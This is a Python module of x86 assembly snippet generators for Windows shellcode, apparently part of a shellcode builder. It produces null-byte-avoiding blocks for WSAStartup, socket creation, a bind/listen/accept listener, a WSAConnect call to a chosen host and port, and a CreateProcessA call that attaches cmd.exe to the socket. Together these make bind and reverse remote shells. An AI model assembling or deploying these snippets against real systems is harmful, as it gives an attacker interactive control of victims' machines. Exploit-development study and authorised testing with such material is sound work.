"""
Reusable x86 assembly snippet blocks.

Register conventions (all snippets follow these):
    ESI   socket handle — set before STARTUPINFOA blocks, consumed by bind/listen/accept
    EDI   STARTUPINFOA pointer — set by startupinfoa blocks, consumed by createprocessa
    EBX   command string pointer — set by cmd_string, consumed by createprocessa

Static snippets are module-level strings ready to paste.
Parameterized snippets are functions that return strings.
"""

from .encoding import encode_ip, encode_port


# ── Static snippets ────────────────────────────────────────────────────────────

SNIPPET_STARTUPINFOA_SOCKET = """\
create_startupinfoa:
    push  esi                        # hStdError   (ESI = socket handle)
    push  esi                        # hStdOutput
    push  esi                        # hStdInput
    xor   eax, eax
    push  eax                        # lpReserved2
    push  eax                        # cbReserved2 & wShowWindow
    mov   al, 0x80
    xor   ecx, ecx
    mov   cl, 0x80
    add   eax, ecx                   # dwFlags = STARTF_USESTDHANDLES (0x100)
    push  eax
    xor   eax, eax
    push  eax                        # dwFillAttribute
    push  eax                        # dwYCountChars
    push  eax                        # dwXCountChars
    push  eax                        # dwYSize
    push  eax                        # dwXSize
    push  eax                        # dwY
    push  eax                        # dwX
    push  eax                        # lpTitle
    push  eax                        # lpDesktop
    push  eax                        # lpReserved
    mov   al, 0x44
    push  eax                        # cb = 0x44 (sizeof STARTUPINFOA)
    push  esp
    pop   edi                        # EDI = &STARTUPINFOA"""

SNIPPET_STARTUPINFOA_NULL = """\
create_startupinfoa:
    xor   eax, eax
    push  eax                        # hStdError  = NULL
    push  eax                        # hStdOutput = NULL
    push  eax                        # hStdInput  = NULL
    push  eax                        # lpReserved2
    push  eax                        # cbReserved2 & wShowWindow
    push  eax                        # dwFlags = 0
    push  eax                        # dwFillAttribute
    push  eax                        # dwYCountChars
    push  eax                        # dwXCountChars
    push  eax                        # dwYSize
    push  eax                        # dwXSize
    push  eax                        # dwY
    push  eax                        # dwX
    push  eax                        # lpTitle
    push  eax                        # lpDesktop
    push  eax                        # lpReserved
    mov   al, 0x44
    push  eax                        # cb = 0x44 (sizeof STARTUPINFOA)
    push  esp
    pop   edi                        # EDI = &STARTUPINFOA"""

SNIPPET_CMD_STRING = """\
create_cmd_string:
    mov   eax, 0xff9a879b            # negated encoding avoids null bytes
    neg   eax                        # EAX = 0x00657865 ("exe\\x00")
    push  eax
    push  0x2e646d63                 # "cmd."
    push  esp
    pop   ebx                        # EBX = "cmd.exe\""""


# ── Parameterized snippets ─────────────────────────────────────────────────────

def snippet_createprocessa(slot: int) -> str:
    """
    Build a STARTUPINFOA-based CreateProcessA call.
    Requires: EDI = &STARTUPINFOA, EBX = command string ("cmd.exe").
    """
    return (
        'call_createprocessa:\n'
        '    mov   eax, esp\n'
        '    xor   ecx, ecx\n'
        '    mov   cx, 0x390\n'
        '    sub   eax, ecx                   # lpProcessInformation (below stack)\n'
        '    push  eax\n'
        '    push  edi                        # lpStartupInfo\n'
        '    xor   eax, eax\n'
        '    push  eax                        # lpCurrentDirectory\n'
        '    push  eax                        # lpEnvironment\n'
        '    push  eax                        # dwCreationFlags\n'
        '    inc   eax\n'
        '    push  eax                        # bInheritHandles = TRUE\n'
        '    dec   eax\n'
        '    push  eax                        # lpThreadAttributes\n'
        '    push  eax                        # lpProcessAttributes\n'
        '    push  ebx                        # lpCommandLine ("cmd.exe")\n'
        '    push  eax                        # lpApplicationName\n'
        f'    call  dword ptr [ebp+{hex(slot)}]       # CreateProcessA'
    )


def snippet_terminateprocess(slot: int) -> str:
    """Terminate the current process cleanly via TerminateProcess(-1, 0)."""
    return (
        'call_terminateprocess:\n'
        '    xor   ecx, ecx\n'
        '    push  ecx                        # uExitCode = 0\n'
        '    push  0xffffffff                 # hProcess = current process\n'
        f'    call  dword ptr [ebp+{hex(slot)}]       # TerminateProcess'
    )


def snippet_wsa_init(slot: int) -> str:
    """Call WSAStartup(2.2, lpWSAData). WSADATA buffer placed below the stack frame."""
    return (
        'call_wsastartup:\n'
        '    mov   eax, esp\n'
        '    mov   cx, 0x590\n'
        '    sub   eax, ecx                   # lpWSAData buffer (below stack)\n'
        '    push  eax\n'
        '    xor   eax, eax\n'
        '    mov   ax, 0x0202                 # wVersionRequired = 2.2\n'
        '    push  eax\n'
        f'    call  dword ptr [ebp+{hex(slot)}]       # WSAStartup'
    )


def snippet_wsa_socket_tcp(slot: int) -> str:
    """
    Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0).
    Result in EAX.
    """
    return (
        'call_wsasocketa:\n'
        '    xor   eax, eax\n'
        '    push  eax                        # dwFlags\n'
        '    push  eax                        # g\n'
        '    push  eax                        # lpProtocolInfo\n'
        '    mov   al, 0x06\n'
        '    push  eax                        # protocol = IPPROTO_TCP\n'
        '    sub   al, 0x05\n'
        '    push  eax                        # type = SOCK_STREAM\n'
        '    inc   eax\n'
        '    push  eax                        # af = AF_INET\n'
        f'    call  dword ptr [ebp+{hex(slot)}]       # WSASocketA -> EAX = socket'
    )


def snippet_sockaddr_bind(port: int) -> str:
    """
    Save EAX (socket) to ESI, build sockaddr_in for 0.0.0.0:<port> at ESP.
    EDI = &sockaddr_in after this block.
    """
    port_enc, port_warn = encode_port(port)
    warn = f'    # WARNING: port {port} produces a null byte in encoding\n' if port_warn else ''
    return (
        'create_sockaddr_bind:\n'
        '    mov   esi, eax                   # ESI = socket descriptor\n'
        '    xor   eax, eax\n'
        '    push  eax                        # sin_addr = 0.0.0.0 (all interfaces)\n'
        f'{warn}'
        f'    mov   ax, {hex(port_enc)}                # port {port} (network byte order)\n'
        '    shl   eax, 0x10\n'
        '    add   ax, 0x02                   # AF_INET\n'
        '    push  eax                        # sin_port + sin_family\n'
        '    push  esp\n'
        '    pop   edi                        # EDI = &sockaddr_in'
    )


def snippet_bind_listen_accept(bind_slot: int, listen_slot: int, accept_slot: int) -> str:
    """
    Call bind(ESI, EDI, 16) → listen(ESI, 0) → accept(ESI, NULL, NULL).
    After accept, ESI = accepted client socket.
    """
    return (
        'call_bind:\n'
        '    xor   eax, eax\n'
        '    add   al, 0x10                   # namelen = sizeof(sockaddr_in)\n'
        '    push  eax\n'
        '    push  edi                        # addr = &sockaddr_in\n'
        '    push  esi                        # socket\n'
        f'    call  dword ptr [ebp+{hex(bind_slot)}]          # bind\n'
        'call_listen:\n'
        '    xor   eax, eax\n'
        '    push  eax                        # backlog = 0\n'
        '    push  esi                        # socket\n'
        f'    call  dword ptr [ebp+{hex(listen_slot)}]         # listen\n'
        'call_accept:\n'
        '    xor   eax, eax\n'
        '    push  eax                        # addrlen = NULL\n'
        '    push  eax                        # addr = NULL\n'
        '    push  esi                        # socket\n'
        f'    call  dword ptr [ebp+{hex(accept_slot)}]         # accept -> EAX = client socket\n'
        '    mov   esi, eax                   # ESI = accepted socket handle'
    )


def snippet_wsaconnect(lhost: str, lport: int, slot: int) -> str:
    """
    Save EAX (socket) to ESI, build sockaddr_in for <lhost>:<lport>, call WSAConnect.
    """
    ip_val,   ip_warn   = encode_ip(lhost)
    port_enc, port_warn = encode_port(lport)
    ip_note   = f'    # WARNING: {lhost} contains a zero octet - null byte in push value\n' if ip_warn   else ''
    port_note = f'    # WARNING: port {lport} produces a null byte in encoding\n'            if port_warn else ''
    return (
        'call_wsaconnect:\n'
        '    mov   esi, eax                   # ESI = socket descriptor\n'
        '    xor   eax, eax\n'
        '    push  eax                        # sin_zero[1]\n'
        '    push  eax                        # sin_zero[0]\n'
        f'{ip_note}'
        f'    push  {hex(ip_val)}              # sin_addr = {lhost}\n'
        f'{port_note}'
        f'    mov   ax, {hex(port_enc)}                # port {lport} (network byte order)\n'
        '    shl   eax, 0x10\n'
        '    add   ax, 0x02                   # AF_INET\n'
        '    push  eax                        # sin_port + sin_family\n'
        '    push  esp\n'
        '    pop   edi                        # EDI = &sockaddr_in\n'
        '    xor   eax, eax\n'
        '    push  eax                        # lpGQOS\n'
        '    push  eax                        # lpSQOS\n'
        '    push  eax                        # lpCalleeData\n'
        '    push  eax                        # lpCallerData\n'
        '    add   al, 0x10                   # namelen = 16\n'
        '    push  eax\n'
        '    push  edi                        # name = &sockaddr_in\n'
        '    push  esi                        # socket\n'
        f'    call  dword ptr [ebp+{hex(slot)}]       # WSAConnect'
    )
